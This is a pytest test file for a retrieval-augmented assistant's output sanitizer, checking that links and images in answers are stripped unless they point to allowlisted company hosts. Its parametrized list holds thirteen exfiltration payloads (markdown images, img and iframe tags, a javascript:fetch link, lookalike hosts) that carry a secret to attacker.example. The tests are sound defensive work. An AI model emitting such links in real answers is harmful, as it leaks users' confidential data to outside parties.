"""R-2: zero-click exfiltration channels are removed from authorized answers."""
from __future__ import annotations

import pytest

from packages.rag_core.output_safety import OutputLinkPolicy, sanitize_answer

POLICY = OutputLinkPolicy.from_csv("contoso.sharepoint.com,.docs.contoso.com")
SECRET = "Q3-LAYOFFS-ACME"


@pytest.mark.parametrize("payload", [
    f"Summary.\n![logo](https://attacker.example/p.png?d={SECRET})",
    f"![](https://attacker.example/{SECRET}.png \"t\")",
    f"<img src=\"https://attacker.example/?d={SECRET}\">",
    f"<IMG SRC=https://attacker.example/x?{SECRET}>",
    f"<iframe src=\"https://attacker.example/{SECRET}\"></iframe>",
    f"See [details](https://attacker.example/?q={SECRET}).",
    f"Read <https://attacker.example/{SECRET}>",
    f"Unfurled preview https://attacker.example/c?d={SECRET}.",
    f"![x][r]\n\n[r]: https://attacker.example/{SECRET}",
    f"[click](javascript:fetch('https://attacker.example/{SECRET}'))",
    f"![a](data:image/png;base64,{SECRET})",
    f"![a](//attacker.example/{SECRET})",
    f"[a](https://user:pw@contoso.sharepoint.com.attacker.example/{SECRET})",
])
def test_exfiltration_payloads_are_neutralized(payload):
    safe, removed = sanitize_answer(payload, POLICY)
    assert removed >= 1
    assert "attacker.example" not in safe and "javascript:" not in safe and "data:image" not in safe


def test_allowlisted_company_links_and_plain_text_survive_unchanged():
    text = ("Per the [Q3 plan](https://contoso.sharepoint.com/sites/fin/plan.docx) and "
            "https://wiki.docs.contoso.com/page, revenue grew 12%. See the [team page](/team).\n"
            "Formula: a < b and c > d. Arrays like x[0](y) are fine.")
    safe, removed = sanitize_answer(text, POLICY)
    assert safe == text and removed == 0


def test_lookalike_hosts_are_not_allowlisted():
    for url in ("https://contoso.sharepoint.com.evil.example/x", "https://evilcontoso.sharepoint.com/x",
                "https://docs.contoso.com.evil.example/"):
        safe, removed = sanitize_answer(f"see {url}", POLICY)
        assert removed == 1 and "evil" not in safe


def test_default_policy_allows_no_external_hosts():
    safe, removed = sanitize_answer("Visit https://example.com/a and ![i](https://example.com/i.png)", OutputLinkPolicy())
    assert removed == 2 and "example.com" not in safe


def test_allowlist_configuration_rejects_urls_and_wildcards():
    for bad in ("https://contoso.com", "*.contoso.com", "contoso.com/path", "localhost"):
        with pytest.raises(ValueError):
            OutputLinkPolicy.from_csv(bad)
